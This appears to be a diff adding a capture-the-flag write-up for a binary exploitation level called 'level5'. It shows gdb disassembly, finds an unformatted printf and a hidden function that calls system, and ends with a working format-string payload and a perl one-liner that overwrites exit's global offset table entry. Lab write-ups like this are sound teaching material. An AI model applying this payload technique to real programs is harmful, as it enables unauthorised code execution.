@@ -1,0 +1,52 @@
+Again... a printf level !
+
+Looking at asm :
+
+    gdb> disas n
+        ...
+        0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+        0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+        0x080484f0 <+46>:	mov    %eax,(%esp)
+        0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+        0x080484f8 <+54>:	movl   $0x1,(%esp)
+        0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+    
+So there ae no comparisons or anything.
+
+Looking at other possibly hidden functions :
+
+    gdb> info func
+        ...
+        0x080484a4  o # hidden function
+        0x080484c2  n
+        0x08048504  main
+
+    gdb> disas o
+        ...
+        0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+        ...
+    
+We need to call `o` before exit.
+After searching if we can modify a return address the best option we have is to modify `exit` jump into the global offset table :
+
+    gdb> disas exit
+        0x080483d0 <+0>:	jmp    *0x8049838 # target address of value to modify
+        0x080483d6 <+6>:	push   $0x28
+        0x080483db <+11>:	jmp    0x8048370
+
+Address of `o`:     0x080484a4
+address to change:  0x08049838
+
+Payload :
+
+We will change the value in two parts :
+
+1: 0x0804 at address 0x0804983a
+2: 0x84a4 at address 0x08049838
+
+[\x3a\x98\x04\x08][BBBB][\x38\x98\x04\x08][%c%c]["%2038d"]["%hn"]["%31904d"]["%hn"]
+
+Scrips :
+
+perl -e 'print "\x3a\x98\x04\x08"."BBBB"."\x38\x98\x04\x08"."%c%c%2038d%hn%31904d%hn"' > /tmp/payload_5
+cat /tmp/payload_5 | ./level5
